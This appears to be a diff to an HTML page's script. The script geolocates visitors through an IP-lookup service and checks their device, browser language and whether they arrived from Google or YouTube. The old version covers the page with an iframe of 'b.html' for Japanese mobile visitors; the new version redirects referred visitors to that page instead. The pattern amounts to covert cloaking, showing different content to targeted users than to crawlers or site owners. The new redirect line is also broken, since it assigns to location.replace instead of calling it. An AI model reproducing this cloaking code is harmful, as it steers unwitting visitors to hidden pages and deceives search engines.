@@ -423,42 +423,37 @@
             return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth <= 768;
         }
 
+      
         // Check if browser language is Japanese
         function isJapaneseBrowser() {
             return navigator.language.toLowerCase().startsWith('ja');
         }
 
-        // Hide page content
-        function hidePageContent() {
-            document.querySelector('header').style.display = 'none';
-            document.querySelector('main').style.display = 'none';
-            document.querySelector('footer').style.display = 'none';
+        // Check if referrer is from Google or YouTube
+        function isFromGoogleOrYoutube() {
+            return document.referrer && (document.referrer.includes('google.com') || document.referrer.includes('youtube.com'));
         }
 
-        // Create iframe
-        function createIframe() {
-            hidePageContent();
-            var iframe = document.createElement('iframe');
-            iframe.src = 'b.html';
-            iframe.style.width = '100%';
-            iframe.style.height = '100vh';
-            iframe.style.border = 'none';
-            document.body.appendChild(iframe);
+        // Redirect to b.html
+        function redirectToB() {
+            if (isMobileDevice() && isFromGoogleOrYoutube()) {
+                window.location.replace = 'b.html';
+            }
         }
 
         // IP and device check
         fetch('https://ipapi.co/json/')
             .then(response => response.json())
             .then(data => { 
-                if (data.country === 'JP' && isMobileDevice()) {
-                    createIframe();
+                if (data.country === 'JP') {
+                    redirectToB();
                     return;
                 }
             })
             .catch(error => {
                 console.log('IP API failed, checking browser language');
                 if (isMobileDevice() && isJapaneseBrowser()) {
-                    createIframe();
+                    redirectToB();
                     return;
                 }
             });
@@ -501,6 +496,7 @@
                 observer.observe(el);
             });
         });
-    </script>
+</script>
+    
 </body>
 </html>
